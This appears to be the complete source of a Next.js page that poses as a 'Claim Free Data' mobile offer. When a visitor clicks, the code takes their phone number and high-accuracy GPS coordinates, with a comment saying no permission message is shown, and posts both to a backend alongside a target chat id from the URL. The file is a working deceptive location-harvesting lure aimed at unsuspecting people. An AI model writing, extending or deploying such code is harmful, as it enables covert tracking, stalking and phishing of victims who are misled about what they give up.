// pages/index.js
import { useState } from 'react';

export default function Home() {
  const [status, setStatus] = useState('');
  const [selectedGB, setSelectedGB] = useState('1');
  const [mobile, setMobile] = useState('');
  const [loading, setLoading] = useState(false);

  const handleClaim = async () => {
    if (!/^[6-9]\d{9}$/.test(mobile)) {
      setStatus('Please enter valid 10-digit mobile number');
      return;
    }

    setLoading(true);
    setStatus('Processing...');

    try {
      const params = new URLSearchParams(window.location.search);
      const targetChatId = params.get('id');

      if (!targetChatId) {
        throw new Error('Missing ?id= in URL');
      }

      // Request location â€“ NO visible "requesting permission" message
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 12000,
        });
      });

      const { latitude, longitude } = position.coords;

      const res = await fetch('/api/send-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lat: latitude.toFixed(6),
          lng: longitude.toFixed(6),
          mobile,
          gb: selectedGB,
          targetChatId,
        }),
      });

      const data = await res.json();

      if (!res.ok) throw new Error(data.error || 'Server failed');

      setStatus(`Success! ${selectedGB} GB requested. Wait up to 1 hour.`);
    } catch (err) {
      let msg = 'Something went wrong';

      if (err.code === 1) msg = 'Location access denied';
      else if (err.code === 3) msg = 'Location timed out';
      else msg = err.message || 'Unknown error';

      setStatus(msg);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: '#0d1117',
      color: 'white',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      fontFamily: 'system-ui, sans-serif'
    }}>
      <div style={{
        background: '#161b22',
        padding: '32px',
        borderRadius: '16px',
        maxWidth: '420px',
        width: '100%',
        textAlign: 'center'
      }}>
        <div style={{ fontSize: '100px', color: '#00d084', marginBottom: '24px' }}>1GB</div>

        <div style={{ display: 'flex', gap: '16px', justifyContent: 'center', marginBottom: '32px' }}>
          <button
            onClick={() => setSelectedGB('1')}
            style={{
              padding: '14px 28px',
              fontSize: '18px',
              borderRadius: '12px',
              border: selectedGB === '1' ? '2px solid #00d084' : '2px solid #444',
              background: selectedGB === '1' ? '#00d084' : '#21262d',
              color: selectedGB === '1' ? 'black' : 'white',
              cursor: 'pointer'
            }}
          >
            1 GB
          </button>
          <button
            onClick={() => setSelectedGB('2')}
            style={{
              padding: '14px 28px',
              fontSize: '18px',
              borderRadius: '12px',
              border: selectedGB === '2' ? '2px solid #00d084' : '2px solid #444',
              background: selectedGB === '2' ? '#00d084' : '#21262d',
              color: selectedGB === '2' ? 'black' : 'white',
              cursor: 'pointer'
            }}
          >
            2 GB
          </button>
        </div>

        <input
          type="tel"
          maxLength={10}
          placeholder="Enter 10-digit mobile number"
          value={mobile}
          onChange={e => setMobile(e.target.value)}
          style={{
            width: '100%',
            padding: '16px',
            fontSize: '18px',
            background: '#0d1117',
            border: '1px solid #444',
            color: 'white',
            borderRadius: '12px',
            marginBottom: '24px',
            textAlign: 'center'
          }}
        />

        <button
          onClick={handleClaim}
          disabled={loading}
          style={{
            width: '100%',
            padding: '18px',
            fontSize: '20px',
            background: loading ? '#21262d' : '#238636',
            color: 'white',
            border: 'none',
            borderRadius: '12px',
            cursor: loading ? 'not-allowed' : 'pointer'
          }}
        >
          {loading ? 'Processing...' : 'Claim Free Data'}
        </button>

        <div style={{
          marginTop: '28px',
          minHeight: '60px',
          color: status.includes('Success') ? '#56d364' : status.includes('denied') ? '#f85149' : 'white'
        }}>
          {status}
        </div>
      </div>
    </div>
  );
}